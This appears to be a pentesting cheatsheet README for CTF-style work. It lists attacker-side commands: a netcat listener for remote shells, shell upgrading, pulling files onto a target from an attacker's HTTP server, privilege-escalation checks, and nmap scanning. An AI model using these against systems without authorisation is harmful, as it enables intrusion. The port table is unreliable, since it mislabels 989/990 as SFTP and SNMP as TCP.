# h4x0r-cheatsheet

**Open a port to listen for a connection from a remote host**  
```nc -lvnp <desired port>```

**Convert basic shell into bash**  
```python -c 'import pty; pty.spawn("/bin/bash")'```

**Download files to remote host via shell**  
Local (Attacker): ```python -m SimpleHTTPServer 80```  _**OR**_ ```python3 -m http.server 80```  
Remote (Target): ```wget <your ip>/desired.file``` _**OR**_ ```curl <your IP>/desired.file```

**Check which files the current user can run as root (possible PrivEsc)**  
```sudo -l```

**Display all running processes with owner**  
```ps aux```

**Display all processes listening on ports**  
```netstat -lntup```  
	**Specific application**  
	```netstat -lntup | grep "<appname>"```  
	**Specific port**  
	```netstat -lntup | grep ":<port>"```  
_**OR**_  
```ss -lntu```

**Display all open Internet and network files**  
```lsof -i```

## nmap commands
**Scan for common open ports**  
```nmap <target ip>```

**Scan for ports at ultra high speed**  
```nmap -T5 <target ip>```

**Scan steathily (slower)**  
```nmap -sS <target ip>```

**Scan specific ports for versions and possible vulns**  
```nmap -sC -sV -p <port>(,<port>,...)```

**Scan for OS**  
```nmap -O <target ip>```

**Get more verbose output**  
```nmap -vvv <target ip>```

**Save to file**  
```nmap -oN <filename> <target ip>```

## common ports
| Number | Service | Protocol |
| ------ | ------- | -------- |
| 20,21  | FTP     | TCP      |
| 22     | SSH     | TCP/UDP  |
| 23     | Telnet  | TCP      |
| 25     | SMTP    | TCP      |
| 53     | DNS     | TCP/UDP  |
| 80     | HTTP    | TCP      |
| 110    | POP3    | TCP      |
| 143    | IMAP4   | TCP/UDP  |
| 161,162 | SNMP   | TCP      |
| 443    | HTTPS   | TCP/UDP  |
| 989,990 | SFTP   | TCP      |
| 3389   | RDP     | TCP/UDP  |
